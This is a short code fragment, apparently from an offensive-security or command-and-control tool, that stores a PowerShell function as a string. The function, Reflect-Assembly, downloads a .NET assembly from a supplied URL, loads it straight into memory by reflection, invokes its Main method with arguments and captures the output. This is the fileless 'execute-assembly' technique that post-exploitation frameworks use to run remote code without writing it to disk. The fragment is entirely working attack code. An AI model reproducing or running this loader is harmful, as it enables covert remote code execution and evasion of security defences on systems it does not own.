
get_execute_assembly = """
Function Reflect-Assembly {
    param(
        [Parameter(Mandatory=$true)][Uri] $URL,
        [String] $Arguments
    )
    process {
        #Download to string from URL
        $data = (New-Object System.Net.WebClient).DownloadData($URL)

        #Reflect
        $assem = [System.Reflection.Assembly]::Load($data)

        #Find EntryPoint
        $nspace = $assem.DefinedTypes | Where-Object name -eq 'Program'
        $method = $nspace.GetMethods() | Where-Object Name -eq 'Main'
        if ($null -eq $method) {
            $method = $nspace.GetMethods([Reflection.BindingFlags]::NonPublic -bor [Reflection.BindingFlags]::Static) | Where-Object Name -eq 'Main'
        }

        #Execute with Arguments
        [String[]] $argumentString = $Arguments.split()
        [Object[]] $Params=@(,$argumentString)
        $OldConsoleOut=[Console]::Out
        $StringWriter=New-Object IO.StringWriter
        [Console]::SetOut($StringWriter)
        $method.Invoke($null,$Params)
        [Console]::SetOut($OldConsoleOut)
        $Results=$StringWriter.ToString()
        return $Results
    }
}
"""